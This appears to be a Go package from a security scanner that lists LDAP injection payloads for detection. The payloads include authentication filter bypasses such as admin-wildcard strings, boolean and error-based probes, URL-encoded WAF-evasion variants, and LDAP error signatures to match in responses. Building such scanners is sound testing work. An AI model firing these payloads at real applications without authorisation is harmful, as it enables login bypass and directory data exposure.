// Package ldap provides payloads for LDAP Injection detection.
package ldap

// InjectionType represents the type of LDAP injection technique.
type InjectionType string

const (
	TypeFilterBypass InjectionType = "filter_bypass"
	TypeWildcard     InjectionType = "wildcard"
	TypeBoolBased    InjectionType = "bool_based"
	TypeErrorBased   InjectionType = "error_based"
)

// Payload represents an LDAP injection payload.
type Payload struct {
	Value       string
	Type        InjectionType
	Description string
	WAFBypass   bool
}

var payloads = []Payload{
	// Filter bypass payloads
	{Value: "*", Type: TypeWildcard, Description: "Wildcard to match all entries"},
	{Value: "*)(&", Type: TypeFilterBypass, Description: "Close filter and start new"},
	{Value: "*)(objectClass=*", Type: TypeFilterBypass, Description: "Close and add wildcard objectClass"},
	{Value: "*)(%26", Type: TypeFilterBypass, Description: "URL encoded AND operator"},
	{Value: "*()|%26'", Type: TypeFilterBypass, Description: "Mixed filter bypass"},
	{Value: "*)(uid=*))(|(uid=*", Type: TypeFilterBypass, Description: "OR-based filter injection"},
	{Value: "admin)(&)", Type: TypeFilterBypass, Description: "Admin filter bypass"},
	{Value: "admin)(|(password=*))", Type: TypeFilterBypass, Description: "Password wildcard bypass"},
	{Value: "*)(&(objectClass=*))", Type: TypeFilterBypass, Description: "ObjectClass wildcard injection"},

	// Boolean-based detection
	{Value: "*)(cn=*", Type: TypeBoolBased, Description: "CN wildcard injection"},
	{Value: "*)(|(cn=*))", Type: TypeBoolBased, Description: "OR CN wildcard"},
	{Value: "admin)(!(&(1=0)))", Type: TypeBoolBased, Description: "Boolean true injection"},
	{Value: "admin)(&(1=0))", Type: TypeBoolBased, Description: "Boolean false injection"},

	// Error-based detection
	{Value: "\\", Type: TypeErrorBased, Description: "Backslash to cause parse error"},
	{Value: ")(", Type: TypeErrorBased, Description: "Unbalanced parentheses"},
	{Value: "))(", Type: TypeErrorBased, Description: "Double close parenthesis"},
	{Value: "*()|&'", Type: TypeErrorBased, Description: "Special chars to cause error"},
	{Value: "\\00", Type: TypeErrorBased, Description: "Null byte injection"},

	// WAF bypass variants
	{Value: "%2a%29%28%7c%28uid%3d%2a%29", Type: TypeFilterBypass, Description: "URL encoded filter bypass", WAFBypass: true},
	{Value: "%2a%29%28%26", Type: TypeFilterBypass, Description: "URL encoded AND bypass", WAFBypass: true},
	{Value: "admin%29%28%21%28%26%281%3d0%29%29%29", Type: TypeBoolBased, Description: "URL encoded boolean", WAFBypass: true},
}

// ErrorPatterns are LDAP error patterns to look for in responses.
var ErrorPatterns = []string{
	"javax.naming.NamingException",
	"LDAPException",
	"com.sun.jndi.ldap",
	"Invalid DN syntax",
	"LDAP error",
	"ldap_search",
	"ldap_bind",
	"ldap_connect",
	"invalid filter",
	"Bad search filter",
	"Protocol error",
	"Size limit exceeded",
	"ldap://",
	"Active Directory",
	"OpenLDAP",
}

// GetPayloads returns all LDAP injection payloads.
func GetPayloads() []Payload {
	return payloads
}

// GetWAFBypassPayloads returns only WAF bypass payloads.
func GetWAFBypassPayloads() []Payload {
	var result []Payload
	for _, p := range payloads {
		if p.WAFBypass {
			result = append(result, p)
		}
	}
	return result
}

// GetByType returns payloads for a specific injection type.
func GetByType(injType InjectionType) []Payload {
	var result []Payload
	for _, p := range payloads {
		if p.Type == injType {
			result = append(result, p)
		}
	}
	return result
}

// GetErrorPatterns returns LDAP error patterns.
func GetErrorPatterns() []string {
	return ErrorPatterns
}
